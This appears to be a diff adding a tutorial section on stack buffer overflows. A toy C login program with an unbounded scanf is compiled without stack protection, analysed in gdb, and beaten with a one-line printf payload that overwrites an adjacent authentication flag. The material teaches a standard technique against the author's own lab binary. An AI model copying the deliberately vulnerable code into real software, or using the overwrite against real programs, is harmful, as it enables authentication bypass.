@@ -327,3 +327,268 @@ my_function:
     ret                ; Pop return address and jump to it
 ```
 
+## Buffer OverFlow Attacks
+
+### 1. Overflowing a Variable On Stack
+
+Consider this C program
+
+```c
+#include <stdio.h>
+#include <string.h>
+
+
+void grantAccess() {
+	printf("Access Granted\n");
+}
+
+void checkPassword(char* password, int *isAuthenticated) {
+
+	if (strcmp(password, "admin123") == 0) {
+		*isAuthenticated = 1;
+	}
+}
+
+
+void AuthenticateUser() {
+	int  isAuthenticated = 0;
+	char password[8];
+
+	printf("Enter password: ");
+	scanf("%s", password);
+
+	checkPassword(password, &isAuthenticated);
+
+	if (isAuthenticated == 1) {
+		grantAccess();
+	} else {
+		printf("Authentication Failed\n");
+	}
+
+}
+
+int main() {
+	AuthenticateUser();
+}
+```
+
+This is the normal working of the program
+
+```
+$ gcc main.c
+$ ./a.out
+Enter password: password
+Authentication Failed
+$ ./a.out
+Enter password: admin123
+Access Granted
+```
+
+What if we don't know the correct password? Can we still gain access?
+
+The vulnerability lies in `scanf("%s", password);` which performs no bounds checking. This allows us to write more than 8 bytes into the `password` buffer, potentially overwriting adjacent stack variables—specifically, the `isAuthenticated` variable.
+
+**Stack layout when `AuthenticateUser()` is executing:**
+```
+Higher Addresses
++-------------------------+
+| Saved return address    | ← Return address to main()
++-------------------------+
+| Saved RBP               | ← Previous stack frame base
++-------------------------+ ← RBP (current frame base)
+| isAuthenticated (4 bytes) | ← [RBP-4]
++-------------------------+
+| padding (if any)        |
++-------------------------+
+| password[8]             | ← [RBP-12] (buffer starts here)
++-------------------------+ ← RSP (stack pointer)
+Lower Addresses
+```
+
+Now let's compile another version of the code known as `vuln`
+
+```
+$ gcc -fno-stack-protector  -O0 -o vuln  main.c
+```
+
+**Why `-fno-stack-protector?`**
+
+The `-fno-stack-protector` flag disables GCC's Stack Smashing Protector (SSP), also known as Stack Guard or ProPolice.
+
+The Stack Guard's main feature is stack canary - although the existence of stsck canary doesn't stop this attack, we still need to disable it because Stack Guard also reorders the variables in stack such that `isAuthenticated` appears after `password`, so we would never be able to rewrite the password. 
+
+`-O0` will disable all compiler optimizations, so we can see all the assembly code.
+
+Let's start by printing the disassembly of the key functions
+
+```bash
+(gdb) disass AuthenticateUser
+Dump of assembler code for function AuthenticateUser:
+   0x00000000000011fe <+0>:	endbr64
+   0x0000000000001202 <+4>:	push   rbp
+   0x0000000000001203 <+5>:	mov    rbp,rsp
+   0x0000000000001206 <+8>:	sub    rsp,0x10
+   0x000000000000120a <+12>:	mov    DWORD PTR [rbp-0x4],0x0
+   0x0000000000001211 <+19>:	lea    rax,[rip+0xe04]        # 0x201c
+   0x0000000000001218 <+26>:	mov    rdi,rax
+   0x000000000000121b <+29>:	mov    eax,0x0
+   0x0000000000001220 <+34>:	call   0x1090 <printf@plt>
+   0x0000000000001225 <+39>:	lea    rax,[rbp-0xc]
+   0x0000000000001229 <+43>:	mov    rsi,rax
+   0x000000000000122c <+46>:	lea    rax,[rip+0xdfa]        # 0x202d
+   0x0000000000001233 <+53>:	mov    rdi,rax
+   0x0000000000001236 <+56>:	mov    eax,0x0
+   0x000000000000123b <+61>:	call   0x10b0 <__isoc99_scanf@plt>
+   0x0000000000001240 <+66>:	lea    rdx,[rbp-0x4]
+   0x0000000000001244 <+70>:	lea    rax,[rbp-0xc]
+   0x0000000000001248 <+74>:	mov    rsi,rdx
+   0x000000000000124b <+77>:	mov    rdi,rax
+   0x000000000000124e <+80>:	call   0x11c3 <checkPassword>
+   0x0000000000001253 <+85>:	mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000001256 <+88>:	cmp    eax,0x1
+   0x0000000000001259 <+91>:	jne    0x1267 <AuthenticateUser+105>
+   0x000000000000125b <+93>:	mov    eax,0x0
+   0x0000000000001260 <+98>:	call   0x11a9 <grantAccess>
+   0x0000000000001265 <+103>:	jmp    0x1276 <AuthenticateUser+120>
+   0x0000000000001267 <+105>:	lea    rax,[rip+0xdc2]        # 0x2030
+   0x000000000000126e <+112>:	mov    rdi,rax
+   0x0000000000001271 <+115>:	call   0x1080 <puts@plt>
+   0x0000000000001276 <+120>:	nop
+   0x0000000000001277 <+121>:	leave
+   0x0000000000001278 <+122>:	ret
+End of assembler dump.
+(gdb) disass checkPassword
+Dump of assembler code for function checkPassword:
+   0x00000000000011c3 <+0>:	endbr64
+   0x00000000000011c7 <+4>:	push   rbp
+   0x00000000000011c8 <+5>:	mov    rbp,rsp
+   0x00000000000011cb <+8>:	sub    rsp,0x10
+   0x00000000000011cf <+12>:	mov    QWORD PTR [rbp-0x8],rdi
+   0x00000000000011d3 <+16>:	mov    QWORD PTR [rbp-0x10],rsi
+   0x00000000000011d7 <+20>:	mov    rax,QWORD PTR [rbp-0x8]
+   0x00000000000011db <+24>:	lea    rdx,[rip+0xe31]        # 0x2013
+   0x00000000000011e2 <+31>:	mov    rsi,rdx
+   0x00000000000011e5 <+34>:	mov    rdi,rax
+   0x00000000000011e8 <+37>:	call   0x10a0 <strcmp@plt>
+   0x00000000000011ed <+42>:	test   eax,eax
+   0x00000000000011ef <+44>:	jne    0x11fb <checkPassword+56>
+   0x00000000000011f1 <+46>:	mov    rax,QWORD PTR [rbp-0x10]
+   0x00000000000011f5 <+50>:	mov    DWORD PTR [rax],0x1
+   0x00000000000011fb <+56>:	nop
+   0x00000000000011fc <+57>:	leave
+   0x00000000000011fd <+58>:	ret
+End of assembler dump.
+```
+
+By looking at the assembly of `AuthenticateUser` we can pinpoint where `isAuthenticated` and `password` are located on stack.
+
+1. `isAuthenticated` at `[rbp-0x4]`
+
+```asm
+0x120a <+12>: mov    DWORD PTR [rbp-0x4],0x0
+```
+
+this is writing 0 to the address [rbp-0x4], which is equivalent to the C code
+
+```c
+int isAuthenticated = 0;  // Initialize to 0
+```
+
+2. `password` is at `[rbp-0xc]`
+
+We can just figure it out by looking at the arguments passed to `checkPassword`
+
+```
+0x1240 <+66>: lea    rdx,[rbp-0x4]             ; Load address of [rbp-0x4]
+0x1244 <+70>: lea    rax,[rbp-0xc]             ; Load address of [rbp-0xc]
+0x1248 <+74>: mov    rsi,rdx                   ; 2nd arg: &isAuthenticated
+0x124b <+77>: mov    rdi,rax                   ; 1st arg: password
+0x124e <+80>: call   0x11c3 <checkPassword>
+```
+
+We know `rdi` contains first password and `rsi` contains second, from C code we can see first parameter is `password` and second parameter is `isAuthenticated`.
+
+Now let's place a breakpoint right before this code
+
+```c
+	if (isAuthenticated == 1) {
+```
+
+We can spot the corresponding `cmp` assembly operation here
+
+```
+   0x000000000000124e <+80>:	call   0x11c3 <checkPassword>
+   0x0000000000001253 <+85>:	mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000001256 <+88>:	cmp    eax,0x1
+   0x0000000000001259 <+91>:	jne    0x1267 <AuthenticateUser+105>
+   0x000000000000125b <+93>:	mov    eax,0x0
+   0x0000000000001260 <+98>:	call   0x11a9 <grantAccess>
+   0x0000000000001265 <+103>:	jmp    0x1276 <AuthenticateUser+120>
+```
+
+Note that `b *0x0000000000001256` won't work because the addresses we are seeing are the offsets in ELF. But since our binary is a PIE executable there will be a constant offset added, we can figure out the actual address using that offset or we can simply place it like this
+
+```bash
+(gdb)  break *AuthenticateUser+88
+Breakpoint 4 at 0x555555555256
+```
+
+GDB allows this since the relative offsets will same and it is aware of the symbols. 
+
+Now let's enter the password
+
+```bash
+(gdb) c
+Continuing.
+Enter password: AAAAAAAA1
+
+Breakpoint 4, 0x0000555555555256 in AuthenticateUser ()
+```
+
+`AAAAAAAA1` is 9 bytes, just 1 byte more than password. Let's inspect the memory to confirm if the overflow happened.
+
+```
+(gdb) x/12xb $rbp - 0xc
+0x7fffffffddf4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffddfc:	0x31	0x00	0x00	0x00
+(gdb) x/1dw $rbp - 0x4
+0x7fffffffddfc:	49
+```
+
+Recall that `$rbp - 0xc` is the address of `password` and `$rbp - 0x4` is the address of `isAuthenticated`. 
+
+In first command we are printing 12 bytes from `0x7fffffffddf4` we can see 9th byte is `0x31` which is the ascii value of `1` we entered at the end. 
+
+But since the value stored is not `0x01` we can see the value of `isAuthenticated` is not `49` which will still fail the check.
+
+```bash
+(gdb) c
+Continuing.
+Authentication Failed
+[Inferior 1 (process 8454) exited normally]
+```
+
+Now we know that overflow actually works, we can actually try to voerwrite `0x01` into the address of `isAuthenticated`. This is the scenario we are hoping for
+
+```
+0x7fffffffddf4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
+0x7fffffffddfc:	0x01	0x00	0x00	0x00
+```
+
+Note that the bytes `0x01	0x00	0x00	0x00` appear reversed compared to the actual notation of 1 in 4-byte (word) format because this is little-endian representation.
+
+The problem is the character whose ascii value is `0x01` is actually a non-printable character which means we can't type it into the terminal. 
+
+But we can pass raw byte stream using utilities like `printf` and pipe its output to our program
+
+```
+$ printf 'AAAAAAAA\x01' | ./vuln
+Enter password: Access Granted
+```
+
+This proves that the overwrite worked in an expected way!
+
+
+
+
+
